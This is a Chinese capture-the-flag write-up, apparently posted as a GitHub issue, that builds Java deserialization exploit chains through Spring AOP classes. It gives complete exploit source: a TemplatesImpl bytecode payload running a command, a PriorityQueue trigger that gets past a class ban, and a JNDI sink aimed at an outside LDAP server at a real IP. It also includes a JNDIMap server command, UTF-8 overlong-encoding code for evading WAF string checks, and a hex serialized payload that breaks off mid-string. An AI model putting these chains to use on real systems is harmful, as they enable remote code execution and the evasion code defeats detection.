这里用的是Spring-Aop的链子

```java
package org.example.spring;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.springframework.aop.aspectj.AspectJAroundAdvice;
import org.springframework.aop.aspectj.AspectJExpressionPointcut;
import org.springframework.aop.aspectj.SingletonAspectInstanceFactory;
import org.springframework.aop.framework.Advised;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.support.DefaultIntroductionAdvisor;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;

public class SpringAop {
    public static void main(String[] args) throws Throwable {

        /// sink TemplatesImpl#getOutputProperties java原生
        byte[] code = getTemplates();
        byte[][] codes = {code};
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "useless");
        setFieldValue(templates, "_tfactory",  new TransformerFactoryImpl(
        ));
        setFieldValue(templates, "_bytecodes", codes);

        /// AspectJAroundAdvice#invoke -> AbstractAspectJAdvice#invokeAdviceMethodWithGivenArgs -> xxx#yyy() spring-aop
        AspectJAroundAdvice aspectJAroundAdvice = new AspectJAroundAdvice(TemplatesImpl.class.getDeclaredMethod("getOutputProperties"), new AspectJExpressionPointcut(),new SingletonAspectInstanceFactory(templates)); // 调用任意对象的无参方法 templates#getOutputProperties()
//        Constructor<ReflectiveMethodInvocation> reflectiveMethodInvocationConstructor = ReflectiveMethodInvocation.class.getDeclaredConstructor(Object.class, Object.class, Method.class, Object[].class, Class.class, List.class);
//        reflectiveMethodInvocationConstructor.setAccessible(true);
//        ArrayList<Object> list = new ArrayList<>();
//        list.add(aspectJAroundAdvice);
//        ReflectiveMethodInvocation  mi = reflectiveMethodInvocationConstructor.newInstance(null, null, String.class.getMethod("toString"), null, null, list);
//        aspectJAroundAdvice.invoke(mi);
//        invocation.proceed();

        /// Proxy#xxx(除了equals,hashcode) -> JdkDynamicAopProxy#invoke -> ReflectiveMethodInvocation#proceed -> AspectJAroundAdvice#invoke spring-aop
        DefaultIntroductionAdvisor advisor = new DefaultIntroductionAdvisor(aspectJAroundAdvice);
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.addAdvisor(advisor);
        Constructor JdkDynamicAopProxyconstructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        JdkDynamicAopProxyconstructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) JdkDynamicAopProxyconstructor.newInstance(advisedSupport);
        Advised o = (Advised) Proxy.newProxyInstance(Advised.class.getClassLoader(), new Class[]{Advised.class}, handler);

        /// BadAttributeValueExpException#readObject -> toString java原生
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        setFieldValue(badAttributeValueExpException, "val", o);

        unserialize(serialize(badAttributeValueExpException));
    }
    public static void setFieldValue(Object obj, String field, Object val) throws Exception{
        Field dField = obj.getClass().getDeclaredField(field);
        dField.setAccessible(true);
        dField.set(obj, val);
    }
    public static byte[] serialize(Object obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return baos.toByteArray();
    }
    public static Object unserialize(byte[] bytes) throws Exception{
        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        return ois.readObject();

    }
    public static byte[] getTemplates() throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass template = pool.makeClass("MyTemplate");
        template.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        String block = "Runtime.getRuntime().exec(\"calc\");";
        template.makeClassInitializer().insertBefore(block);
        return template.toBytecode();
    }
}
```

这里BadAttributeValueExpException被ban了，我们用PriorityQueue来触发compare

![Image](https://github.com/user-attachments/assets/29a0a055-a763-4ee1-bccf-b8b0b9193ba5)

然后我们要找一个无参的sink

### 方法一

这里用的是LdapAttribute#getAttributeDefinition来进行jndi 二次反序列化

```java
import org.springframework.aop.aspectj.AspectJAroundAdvice;
import org.springframework.aop.aspectj.AspectJExpressionPointcut;
import org.springframework.aop.aspectj.SingletonAspectInstanceFactory;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.support.DefaultIntroductionAdvisor;
import javax.naming.CompositeName;
import javax.naming.directory.BasicAttribute;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Base64;
import java.util.Comparator;
import java.util.PriorityQueue;

public class SpringAop {
    public static void main(String[] args) throws Throwable {

        /// sink LdapAttribute#getAttributeDefinition java原生
        Class clazz = Class.forName("com.sun.jndi.ldap.LdapAttribute");
        Constructor constructor = clazz.getDeclaredConstructor(String.class);
        constructor.setAccessible(true);
        BasicAttribute ldapAttribute = (BasicAttribute) constructor.newInstance("name");
        setFieldValue(ldapAttribute, "baseCtxURL", "ldap://124.221.19.214:2333");
        setFieldValue(ldapAttribute, "rdn", new CompositeName("a/b"));
        
        /// AspectJAroundAdvice#invoke -> AbstractAspectJAdvice#invokeAdviceMethodWithGivenArgs -> xxx#yyy() spring-aop
        AspectJAroundAdvice aspectJAroundAdvice = new AspectJAroundAdvice(clazz.getDeclaredMethod("getAttributeDefinition"), new AspectJExpressionPointcut(),new SingletonAspectInstanceFactory(ldapAttribute)); // 调用任意对象的无参方法 LdapAttribute#getAttributeDefinition()

        /// Proxy#xxx(除了equals,hashcode) -> JdkDynamicAopProxy#invoke -> ReflectiveMethodInvocation#proceed -> AspectJAroundAdvice#invoke spring-aop
        DefaultIntroductionAdvisor advisor = new DefaultIntroductionAdvisor(aspectJAroundAdvice);
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.addAdvisor(advisor);
        Constructor JdkDynamicAopProxyconstructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        JdkDynamicAopProxyconstructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) JdkDynamicAopProxyconstructor.newInstance(advisedSupport);
        Comparator o = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class[]{Comparator.class}, handler);

        /// PriorityQueue#readObject -> compare java原生
        PriorityQueue priorityQueue = new PriorityQueue();
        setFieldValue(priorityQueue,"comparator",o);
        setFieldValue(priorityQueue,"queue",new Object[]{1,2}); // compareObject.compare(1,2)
        setFieldValue(priorityQueue,"size",2);
        byte[] ser = serialize(priorityQueue);
        System.out.println(Base64.getEncoder().encodeToString(ser));
        unserialize(ser);
    }
    public static void setFieldValue(Object obj, String field, Object val) throws Exception{
        Field dField = obj.getClass().getDeclaredField(field);
        dField.setAccessible(true);
        dField.set(obj, val);
    }
    public static byte[] serialize(Object obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return baos.toByteArray();
    }
    public static Object unserialize(byte[] bytes) throws Exception{
        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        return ois.readObject();
    }
}
```

这里我用JNDIMap起了服务端，test.ser是用的之前Templates作为sink生成的没有base64编码的序列化数据

```bash
java -jar JNDIMap-0.0.1.jar -i 124.221.19.214 -l 2333 -p 3232 -u /Deserialize/FromFile/test.ser
```

![Image](https://github.com/user-attachments/assets/66e96edd-f9e3-4a43-b140-ac9f660ebe26)

成功弹计算器

![Image](https://github.com/user-attachments/assets/74e379b9-b604-45b3-adf9-7ce5b687a9a2)

但是发包被ban了，因为这里用了javax.naming.CompositeName，所以要绕过字符串检测

![Image](https://github.com/user-attachments/assets/9ced416d-a982-4edc-afc3-e8fb429e6299)

[[这里用Whoopsunix师傅的项目绕过](https://github.com/Whoopsunix/utf-8-overlong-encoding)](https://github.com/Whoopsunix/utf-8-overlong-encoding)

```java
/**
 * @author Whoopsunix
 * <p>
 * UTF-8 混淆
 */
public class UTF8BytesMix {

    public static byte[] resultBytes = new byte[0];
    public static byte[] originalBytes = new byte[0];

    // 加密字节位数
    public static int type = 2; //3

    // 原 byte[] 坐标
    public static int index = 0;

    final static byte TC_CLASSDESC = (byte) 0x72;
    final static byte TC_PROXYCLASSDESC = (byte) 0x7d;
    final static byte TC_STRING = (byte) 0x74;
    final static byte TC_REFERENCE = (byte) 0x71;
    final static byte TC_LONGSTRING = (byte) 0x7C;
    final static byte TC_ARRAY = (byte) 0x75;
    final static byte TC_ENDBLOCKDATA = (byte) 0x78;
    final static byte TC_NULL = (byte) 0x70;


    final static byte Byte = (byte) 0x42;
    final static byte Char = (byte) 0x43;
    final static byte Double = (byte) 0x44;
    final static byte Float = (byte) 0x46;
    final static byte Integer = (byte) 0x49;
    final static byte Long = (byte) 0x4a;
    final static byte Object_L = (byte) 0x4c;
    final static byte Short = (byte) 0x53;
    final static byte Boolean = (byte) 0x5a;
    final static byte Array = (byte) 0x5b;


    public UTF8BytesMix(byte[] originalBytes) {
        this.originalBytes = originalBytes;
    }

    public static byte[] builder() {
        while (index < originalBytes.length) {
            byte b = originalBytes[index];
            byteAdd(b);

            if (b == TC_CLASSDESC) {
                changeTC_CLASSDESC();
            } else if (b == TC_PROXYCLASSDESC) {
                changeTC_PROXYCLASSDESC();
            } else if (b == TC_STRING) {
                changeTC_STRING();
            }

            index++;
        }
        return resultBytes;
    }

    public static void changeTC_PROXYCLASSDESC() {
        int interfaceCount = ((originalBytes[index + 1] & 0xFF) << 24) |
                ((originalBytes[index + 2] & 0xFF) << 16) |
                ((originalBytes[index + 3] & 0xFF) << 8) |
                (originalBytes[index + 4] & 0xFF);
        if (interfaceCount > 0xff || interfaceCount < 0x00)
            return;

        for (int i = 0; i < 4; i++) {
            byteAdd(originalBytes[index + 1]);
            index++;
        }

        int length = ((originalBytes[index + 1] & 0xFF) << 8) | (originalBytes[index + 2] & 0xFF);
        byte[] originalValue = new byte[length];
        System.arraycopy(originalBytes, index + 3, originalValue, 0, length);
        index += 3 + length;

        encode(originalValue, type);
        index--;
    }


    public static boolean changeTC_CLASSDESC() {
        /**
         * 类信息
         */
        boolean isTC_CLASSDESC = changeTC_STRING();
        if (!isTC_CLASSDESC) {
            return false;
        }
        index++;

        /**
         * SerialVersionUID + ClassDescFlags
         */
        byte[] serialVersionUID = new byte[9];
        System.arraycopy(originalBytes, index, serialVersionUID, 0, 9);
        for (int i = 0; i < serialVersionUID.length; i++) {
            byteAdd(serialVersionUID[i]);
        }
        index += 9;

        /**
         * FieldCount
         */
        byte[] fieldCount = new byte[2];
        System.arraycopy(originalBytes, index, fieldCount, 0, 2);
        for (int i = 0; i < fieldCount.length; i++) {
            byteAdd(fieldCount[i]);
        }
        int fieldCounts = ((fieldCount[0] & 0xFF) << 8) | (fieldCount[1] & 0xFF);
        index += 2;

        for (int i = 0; i < fieldCounts; i++) {
            boolean isFiledOver = false;

            /**
             * FieldName
             */
            if (originalBytes[index] == Byte
                    || originalBytes[index] == Char
                    || originalBytes[index] == Double
                    || originalBytes[index] == Float
                    || originalBytes[index] == Integer
                    || originalBytes[index] == Long
                    || originalBytes[index] == Object_L
                    || originalBytes[index] == Short
                    || originalBytes[index] == Boolean
                    || originalBytes[index] == Array) {
                // Object
                byteAdd(originalBytes[index]);
                index++;

                int fieldLength = ((originalBytes[index] & 0xFF) << 8) | (originalBytes[index + 1] & 0xFF);
                byte[] originalFieldName = new byte[fieldLength];
                System.arraycopy(originalBytes, index + 2, originalFieldName, 0, fieldLength);
                index += 2 + fieldLength;
                encode(originalFieldName, type);
            }

            /**
             * Class Name
             *
             * 也规避了这种情况
             *          Index 0:
             *           Integer - I - 0x49
             *           @FieldName
             *             @Length - 4 - 0x00 04
             *             @Value - size - 0x73 69 7a 65
             */
            // TC_STRING 0x74
            if (originalBytes[index] == TC_STRING) {

                byteAdd(originalBytes[index]);
                index++;

                int classLength = ((originalBytes[index] & 0xFF) << 8) | (originalBytes[index + 1] & 0xFF);
                byte[] originalClassName = new byte[classLength];
                System.arraycopy(originalBytes, index + 2, originalClassName, 0, classLength);
                index += 2 + classLength;
                encode(originalClassName, type);
                isFiledOver = true;
            } else if (originalBytes[index] == TC_REFERENCE) {
                /**
                 * Index 0:
                 * Object - L - 0x4c
                 * @FieldName
                 * @Length - 9 - 0x00 09
                 * @Value - decorated - 0x64 65 63 6f 72 61 74 65 64
                 * @ClassName
                 *         TC_REFERENCE - 0x71
                 * @Handler - 8257537 - 0x00 7e 00 01
                 */
                byte[] reference = new byte[5];
                System.arraycopy(originalBytes, index, reference, 0, 5);
                for (int j = 0; j < reference.length; j++) {
                    byteAdd(reference[j]);
                }
                index += 5;
                isFiledOver = true;
            }

            // todo 看看其他可能未识别到的类型
//            if(i < fieldCounts - 1 && !isFiledOver) {
//                while (true) {
//                    if (!isField(originalBytes, index)) {
//                        byteAdd(originalBytes[index]);
//                        index++;
//                    } else {
//                        break;
//                    }
//                }
//            }

        }

        // 循环需要
        index--;
        return true;
    }

    public static boolean changeTC_STRING() {
        int length = ((originalBytes[index + 1] & 0xFF) << 8) | (originalBytes[index + 2] & 0xFF);
        // 溢出
        if (length > 0xff || length < 0x00)
            return false;

        // 原始内容
        byte[] originalValue = new byte[length];
        System.arraycopy(originalBytes, index + 3, originalValue, 0, length);
        // 非全部可见字符，可能存在的报错，不继续执行
        if (!isByteVisible(originalValue)) {
            return false;
        }

        index += 3 + length;
        encode(originalValue, type);

        index--;
        return true;
    }


    public static boolean isField(byte[] checkBytes, int index) {
        if (!(checkBytes[index] == Byte
                || checkBytes[index] == Char
                || checkBytes[index] == Double
                || checkBytes[index] == Float
                || checkBytes[index] == Integer
                || checkBytes[index] == Long
                || checkBytes[index] == Object_L
                || checkBytes[index] == Short
                || checkBytes[index] == Boolean
                || checkBytes[index] == Array)) {
            return false;
        }

        int length = ((checkBytes[index + 1] & 0xFF) << 8) | (checkBytes[index + 2] & 0xFF);
        if (length > 0xff || length < 0x00)
            return false;
        byte[] lengthBytes = new byte[length];
        try {
            System.arraycopy(checkBytes, index + 3, lengthBytes, 0, length);
        } catch (Exception e) {
            return false;
        }

        return true;
    }

    /**
     * 加密
     *
     * @return
     */
    public static void encode(byte[] originalValue, int type) {
        if (type == 3) {
            // 3 byte format: 1110xxxx 10xxxxxx 10xxxxxx
            int newLength = originalValue.length * 3;

            byteAdd((byte) ((newLength >> 8) & 0xFF));
            byteAdd((byte) (newLength & 0xFF));

            for (int i = 0; i < originalValue.length; i++) {
                char c = (char) originalValue[i];
                byteAdd((byte) (0xE0 | ((c >> 12) & 0x0F)));
                byteAdd((byte) (0x80 | ((c >> 6) & 0x3F)));
                byteAdd((byte) (0x80 | ((c >> 0) & 0x3F)));
            }

        } else {
            // 2 byte format: 110xxxxx 10xxxxxx
            int newLength = originalValue.length * 2;

            byteAdd((byte) ((newLength >> 8) & 0xFF));
            byteAdd((byte) (newLength & 0xFF));

            for (int i = 0; i < originalValue.length; i++) {
                char c = (char) originalValue[i];
                byteAdd((byte) (0xC0 | ((c >> 6) & 0x1F)));
                byteAdd((byte) (0x80 | ((c >> 0) & 0x3F)));
            }
        }


    }

    /**
     * 判断字节是否在可见字符的 ASCII 范围内
     *
     * @param bytes
     * @return
     */
    public static boolean isByteVisible(byte[] bytes) {
        for (byte b : bytes) {
            if (b < 32 || b > 126) {
                return false;
            }
        }
        return true;
    }

    public static void byteAdd(byte b) {
        byte[] newBytes = new byte[resultBytes.length + 1];
        System.arraycopy(resultBytes, 0, newBytes, 0, resultBytes.length);
        newBytes[resultBytes.length] = b;
        resultBytes = newBytes;
    }
}
```

序列化的部分用这句修改就可以了

```java
/// UTF8Overlong绕过字符串检测
System.out.println(Base64.getEncoder().encodeToString(new UTF8BytesMix(serialize(priorityQueue)).builder()));
```

成功弹计算器

![Image](https://github.com/user-attachments/assets/360010d5-0f2e-469a-b1e0-9a0f16b91244)

### 方法二

实际上比赛时是不出网的，所以我们不能打jndi，可以用hsqldb打二次反序列化，改个sink链就可以了。二次反序列化的是之前Templates为sink的链，也可以直接打Jackson

```java
import com.alibaba.druid.pool.DruidAbstractDataSource;
import com.alibaba.druid.pool.DruidDataSource;
import com.alibaba.druid.pool.DruidDataSourceFactory;
import com.alibaba.druid.sql.visitor.functions.Hex;
import org.hsqldb.jdbc.JDBCDriver;
import org.springframework.aop.aspectj.AspectJAroundAdvice;
import org.springframework.aop.aspectj.AspectJExpressionPointcut;
import org.springframework.aop.aspectj.SingletonAspectInstanceFactory;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.aop.support.DefaultIntroductionAdvisor;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.Statement;
import java.util.Base64;
import java.util.Comparator;
import java.util.HashMap;
import java.util.PriorityQueue;


public class Hsql {
    public static void main(String[] args) throws Exception {
//        byte[] payload = java.util.Base64.getDecoder().decode("rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc30AAAABABRqYXZhLnV0aWwuQ29tcGFyYXRvcnhyABdqYXZhLmxhbmcucmVmbGVjdC5Qcm94eeEn2iDMEEPLAgABTAABaHQAJUxqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uSGFuZGxlcjt4cHNyADRvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5mcmFtZXdvcmsuSmRrRHluYW1pY0FvcFByb3h5TMS0cQ7rlvwCAARaAA1lcXVhbHNEZWZpbmVkWgAPaGFzaENvZGVEZWZpbmVkTAAHYWR2aXNlZHQAMkxvcmcvc3ByaW5nZnJhbWV3b3JrL2FvcC9mcmFtZXdvcmsvQWR2aXNlZFN1cHBvcnQ7WwARcHJveGllZEludGVyZmFjZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cAAAc3IAMG9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLmZyYW1ld29yay5BZHZpc2VkU3VwcG9ydCTLijz6pMV1AgAFWgALcHJlRmlsdGVyZWRMABNhZHZpc29yQ2hhaW5GYWN0b3J5dAA3TG9yZy9zcHJpbmdmcmFtZXdvcmsvYW9wL2ZyYW1ld29yay9BZHZpc29yQ2hhaW5GYWN0b3J5O0wACGFkdmlzb3JzdAAQTGphdmEvdXRpbC9MaXN0O0wACmludGVyZmFjZXNxAH4ADUwADHRhcmdldFNvdXJjZXQAJkxvcmcvc3ByaW5nZnJhbWV3b3JrL2FvcC9UYXJnZXRTb3VyY2U7eHIALW9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLmZyYW1ld29yay5Qcm94eUNvbmZpZ4tL8+an4PdvAgAFWgALZXhwb3NlUHJveHlaAAZmcm96ZW5aAAZvcGFxdWVaAAhvcHRpbWl6ZVoAEHByb3h5VGFyZ2V0Q2xhc3N4cAAAAAAAAHNyADxvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5mcmFtZXdvcmsuRGVmYXVsdEFkdmlzb3JDaGFpbkZhY3RvcnlU3WQ34k5x9wIAAHhwc3IAE2phdmEudXRpbC5BcnJheUxpc3R4gdIdmcdhnQMAAUkABHNpemV4cAAAAAF3BAAAAAFzcgA6b3JnLnNwcmluZ2ZyYW1ld29yay5hb3Auc3VwcG9ydC5EZWZhdWx0SW50cm9kdWN0aW9uQWR2aXNvcsjFbkCOBBxCAgADSQAFb3JkZXJMAAZhZHZpY2V0ABxMb3JnL2FvcGFsbGlhbmNlL2FvcC9BZHZpY2U7TAAKaW50ZXJmYWNlc3QAD0xqYXZhL3V0aWwvU2V0O3hwf////3NyADNvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5hc3BlY3RqLkFzcGVjdEpBcm91bmRBZHZpY2UvLmvatAiFnwIAAHhyADVvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5hc3BlY3RqLkFic3RyYWN0QXNwZWN0SkFkdmljZS6UmCf1wbudAgARWgAVYXJndW1lbnRzSW50cm9zcGVjdGVkSQAQZGVjbGFyYXRpb25PcmRlckkAFmpvaW5Qb2ludEFyZ3VtZW50SW5kZXhJACBqb2luUG9pbnRTdGF0aWNQYXJ0QXJndW1lbnRJbmRleEwAEGFyZ3VtZW50QmluZGluZ3N0AA9MamF2YS91dGlsL01hcDtbAA1hcmd1bWVudE5hbWVzdAATW0xqYXZhL2xhbmcvU3RyaW5nO0wAFWFzcGVjdEluc3RhbmNlRmFjdG9yeXQAN0xvcmcvc3ByaW5nZnJhbWV3b3JrL2FvcC9hc3BlY3RqL0FzcGVjdEluc3RhbmNlRmFjdG9yeTtMAAphc3BlY3ROYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAAOZGVjbGFyaW5nQ2xhc3N0ABFMamF2YS9sYW5nL0NsYXNzO0wAHmRpc2NvdmVyZWRSZXR1cm5pbmdHZW5lcmljVHlwZXQAGExqYXZhL2xhbmcvcmVmbGVjdC9UeXBlO0wAF2Rpc2NvdmVyZWRSZXR1cm5pbmdUeXBlcQB+AB9MABZkaXNjb3ZlcmVkVGhyb3dpbmdUeXBlcQB+AB9MAAptZXRob2ROYW1lcQB+AB5bAA5wYXJhbWV0ZXJUeXBlc3EAfgAJTAAIcG9pbnRjdXR0ADtMb3JnL3NwcmluZ2ZyYW1ld29yay9hb3AvYXNwZWN0ai9Bc3BlY3RKRXhwcmVzc2lvblBvaW50Y3V0O0wADXJldHVybmluZ05hbWVxAH4AHkwADHRocm93aW5nTmFtZXEAfgAeeHAAAAAAAP//////////cHBzcgA+b3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuYXNwZWN0ai5TaW5nbGV0b25Bc3BlY3RJbnN0YW5jZUZhY3RvcnmntTGAryc0tAIAAUwADmFzcGVjdEluc3RhbmNldAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAJTAAFX25hbWVxAH4AHkwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAABpMr+ur4AAAA3ABsBAApNeVRlbXBsYXRlBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBAA9NeVRlbXBsYXRlLmphdmEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwAHAQAIPGNsaW5pdD4BAAMoKVYBAARDb2RlAQARamF2YS9sYW5nL1J1bnRpbWUHAAwBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAOAA8KAA0AEAEABGNhbGMIABIBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAUABUKAA0AFgEABjxpbml0PgwAGAAKCgAIABkAIQACAAgAAAAAAAIACAAJAAoAAQALAAAAFgACAAAAAAAKuAAREhO2ABdXsQAAAAAAAQAYAAoAAQALAAAAEQABAAEAAAAFKrcAGrEAAAAAAAEABQAAAAIABnB0AAd1c2VsZXNzcHcBAHh0AAB2cQB+ACZwdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwcQB+ADJ0ABNnZXRPdXRwdXRQcm9wZXJ0aWVzdXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAAAc3IAOW9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLmFzcGVjdGouQXNwZWN0SkV4cHJlc3Npb25Qb2ludGN1dOAJGigDOY8eAgAETAALYmVhbkZhY3Rvcnl0AC9Mb3JnL3NwcmluZ2ZyYW1ld29yay9iZWFucy9mYWN0b3J5L0JlYW5GYWN0b3J5O0wAGHBvaW50Y3V0RGVjbGFyYXRpb25TY29wZXEAfgAfWwAWcG9pbnRjdXRQYXJhbWV0ZXJOYW1lc3EAfgAcWwAWcG9pbnRjdXRQYXJhbWV0ZXJUeXBlc3EAfgAJeHIAOm9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLnN1cHBvcnQuQWJzdHJhY3RFeHByZXNzaW9uUG9pbnRjdXSMooLQ1cEqUAIAAkwACmV4cHJlc3Npb25xAH4AHkwACGxvY2F0aW9ucQB+AB54cHBwcHB1cgATW0xqYXZhLmxhbmcuU3RyaW5nO63SVufpHXtHAgAAeHAAAAAAdXEAfgA0AAAAAHBwc3IAF2phdmEudXRpbC5MaW5rZWRIYXNoU2V02GzXWpXdKh4CAAB4cgARamF2YS51dGlsLkhhc2hTZXS6RIWVlri3NAMAAHhwdwwAAAAQP0AAAAAAAAB4eHNxAH4AEwAAAAB3BAAAAAB4c3IAMG9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLnRhcmdldC5FbXB0eVRhcmdldFNvdXJjZTMTvk4yXLMbAgACWgAIaXNTdGF0aWNMAAt0YXJnZXRDbGFzc3EAfgAfeHABcHVxAH4ANAAAAAN2cgAjb3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuU3ByaW5nUHJveHkAAAAAAAAAAAAAAHhwdnIAKW9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLmZyYW1ld29yay5BZHZpc2VkAAAAAAAAAAAAAAB4cHZyAChvcmcuc3ByaW5nZnJhbWV3b3JrLmNvcmUuRGVjb3JhdGluZ1Byb3h5AAAAAAAAAAAAAAB4cHcEAAAAA3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3EAfgBKAAAAAng=");
//        String s = HexUtil.encodeHexStr(payload);
        /// DruidDataSource#getConnection() sink
        String s = "aced0005737200176a6176612e7574696c2e5072696f72697479517565756594da30b4fb3f82b103000249000473697a654c000a636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b787000000002737d0000000100146a6176612e7574696c2e436f6d70617261746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b7870737200346f72672e737072696e676672616d65776f726b2e616f702e6672616d65776f726b2e4a646b44796e616d6963416f7050726f78794cc4b4710eeb96fc0200045a000d657175616c73446566696e65645a000f68617368436f6465446566696e65644c0007616476697365647400324c6f72672f737072696e676672616d65776f726b2f616f702f6672616d65776f726b2f41647669736564537570706f72743b5b001170726f78696564496e74657266616365737400125b4c6a6176612f6c616e672f436c6173733b78700000737200306f72672e737072696e676672616d65776f726b2e616f702e6672616d65776f726b2e41647669736564537570706f727424cb8a3cfaa4c5750200055a000b70726546696c74657265644c001361647669736f72436861696e466163746f72797400374c6f72672f737072696e676672616d65776f726b2f616f702f6672616d65776f726b2f41647669736f72436861696e466163746f72793b4c000861647669736f72737400104c6a6176612f7574696c2f4c6973743b4c000a696e746572666163657371007e000d4c000c746172676574536f757263657400264c6f72672f737072696e676672616d65776f726b2f616f702f546172676574536f757263653b7872002d6f72672e737072696e676672616d65776f726b2e616f702e6672616d65776f726b2e50726f7879436f6e6669678b4bf3e6a7e0f76f0200055a000b6578706f736550726f78795a000666726f7a656e5a00066f70617175655a00086f7074696d697a655a001070726f7879546172676574436c61737378700000000000007372003c6f72672e737072696e676672616d65776f726b2e616f702e6672616d65776f726b2e44656661756c7441647669736f72436861696e466163746f727954dd6437e24e71f70200007870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a657870000000017704000000017372003a6f72672e737072696e676672616d65776f726b2e616f702e737570706f72742e44656661756c74496e74726f64756374696f6e41647669736f72c8c56e408e041c420200034900056f726465724c000661647669636574001c4c6f72672f616f70616c6c69616e63652f616f702f4164766963653b4c000a696e746572666163657374000f4c6a6176612f7574696c2f5365743b78707fffffff737200336f72672e737072696e676672616d65776f726b2e616f702e6173706563746a2e4173706563744a41726f756e644164766963652f2e6bdab408859f020000787200356f72672e737072696e676672616d65776f726b2e616f702e6173706563746a2e41627374726163744173706563744a4164766963652e949827f5c1bb9d0200115a0015617267756d656e7473496e74726f737065637465644900106465636c61726174696f6e4f726465724900166a6f696e506f696e74417267756d656e74496e6465784900206a6f696e506f696e7453746174696350617274417267756d656e74496e6465784c0010617267756d656e7442696e64696e677374000f4c6a6176612f7574696c2f4d61703b5b000d617267756d656e744e616d65737400135b4c6a6176612f6c616e672f537472696e673b4c0015617370656374496e7374616e6365466163746f72797400374c6f72672f737072696e676672616d65776f726b2f616f702f6173706563746a2f417370656374496e7374616e6365